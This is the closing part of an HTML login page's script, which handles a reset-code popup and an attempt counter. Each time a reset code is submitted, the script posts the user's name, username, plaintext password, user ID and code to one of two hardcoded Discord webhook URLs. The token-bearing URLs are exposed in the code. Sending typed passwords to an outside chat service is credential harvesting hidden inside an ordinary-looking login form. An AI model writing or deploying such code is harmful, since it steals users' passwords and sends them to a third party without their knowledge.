          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 5;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
        } else {
          alert('Incorrect reset code.');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);
      // Event listener for reminder list actions
      document.getElementById('reminderList')?.addEventListener('click', (e) => dashboard.reminders.handleReminderAction(e));


      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();
    })();
  </script>
</body>
</html>
